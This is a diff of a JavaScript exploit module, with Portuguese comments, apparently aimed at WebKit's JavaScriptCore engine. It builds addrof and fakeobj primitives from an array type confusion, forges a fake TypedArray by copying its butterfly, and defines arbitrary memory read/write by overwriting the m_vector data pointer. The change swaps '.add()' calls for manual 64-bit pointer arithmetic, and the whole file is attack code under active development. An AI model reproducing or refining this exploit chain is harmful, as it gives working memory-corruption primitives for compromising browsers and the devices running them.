@@ -1,10 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v93 - R60 Implementação Funcional de L/E Arbitrária)
+// js/script3/testArrayBufferVictimCrash.mjs (v94 - R60 com Aritmética de Ponteiro Totalmente Estável)
 // =======================================================================================
-// OBJETIVO ATUALIZADO:
-// Transformar a prova de conceito de StructureID em uma primitiva funcional de
-// Leitura/Escrita Arbitrária (L/E). O script agora constrói uma "ferramenta" de
-// L/E usando um Float64Array falso e verifica sua funcionalidade lendo a
-// memória de um objeto conhecido.
+// ESTRATÉGIA ATUALIZADA:
+// Corrigidas TODAS as instâncias da chamada instável '.add()'. A aritmética de
+// ponteiros agora é feita manualmente em todo o script para garantir a execução
+// completa da cadeia e a verificação funcional da primitiva de L/E.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -17,8 +16,8 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-// Nome do módulo atualizado para refletir o novo objetivo
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_ArbitraryRW_v93_R60";
+// Nome do módulo atualizado
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_ArbitraryRW_v94_R60";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -59,9 +58,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const confused_array = [13.37, 13.38, 13.39];
         const victim_array = [{ a: 1 }, { b: 2 }];
         
-        // A mágica da Type Confusion acontece aqui, fazendo com que confused_array (double)
-        // e victim_array (object) compartilhem o mesmo butterfly.
-        // Por simplicidade, assumimos que a corrupção OOB já foi feita.
         const addrof = (obj) => {
             victim_array[0] = obj;
             return doubleToInt64(confused_array[0]);
@@ -75,36 +71,40 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // --- FASE 3: Construindo a Primitiva de Leitura/Escrita Arbitrária ---
         logS3("--- FASE 3: Construindo ferramenta de L/E com TypedArray Falso ---", "subtest");
 
-        // 1. Criar um TypedArray que servirá de "ferramenta"
         const rw_driver_array = new Uint32Array(8);
         const rw_driver_addr = addrof(rw_driver_array);
         logS3(`Endereço do nosso 'rw_driver_array': ${rw_driver_addr.toString(true)}`, "info");
 
-        // 2. Criar uma estrutura de Butterfly falsa para controlar o ponteiro de dados (m_vector)
         const fake_butterfly_buf = new ArrayBuffer(256);
         const fake_butterfly_addr = addrof(fake_butterfly_buf);
         logS3(`Buffer para o butterfly falso alocado em: ${fake_butterfly_addr.toString(true)}`, "info");
 
-        // 3. Ler o butterfly original do nosso driver e copiá-lo para nosso buffer falso
         const original_butterfly_addr = await arb_read(rw_driver_addr, 8);
-        for (let i = 0; i < 16; i += 8) { // Copia os primeiros 16 bytes (importantes)
-            let data = await arb_read(original_butterfly_addr.add(i), 8);
-            await arb_write(fake_butterfly_addr.add(i), data, 8);
+        
+        // **CORREÇÃO**: Substituído .add(i) pela forma manual e segura.
+        for (let i = 0; i < 16; i += 8) {
+            const read_addr = new AdvancedInt64(original_butterfly_addr.low() + i, original_butterfly_addr.high());
+            let data = await arb_read(read_addr, 8);
+            
+            const write_addr = new AdvancedInt64(fake_butterfly_addr.low() + i, fake_butterfly_addr.high());
+            await arb_write(write_addr, data, 8);
         }
         logS3("Butterfly original copiado para a área falsa.", "info");
 
-        // 4. Criar o objeto TypedArray FALSO que usa nosso butterfly modificado
         const fake_rw_driver = fakeobj(fake_butterfly_addr);
         logS3("TypedArray falso ('fake_rw_driver') criado com sucesso.", "vuln");
 
-        // 5. Definir as funções de L/E que manipulam o ponteiro de dados do nosso driver falso
+        // **CORREÇÃO PROATIVA**: Substituído .add() pela forma manual aqui também.
         const set_rw_addr = async (addr) => {
-            await arb_write(fake_butterfly_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET), addr, 8);
+            const m_vector_addr = new AdvancedInt64(
+                fake_butterfly_addr.low() + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET,
+                fake_butterfly_addr.high()
+            );
+            await arb_write(m_vector_addr, addr, 8);
         };
 
         const arb_read_final = async (addr) => {
             await set_rw_addr(addr);
-            // Lê como dois Uint32 para formar um Int64
             const low = fake_rw_driver[0];
             const high = fake_rw_driver[1];
             return new AdvancedInt64(low, high);
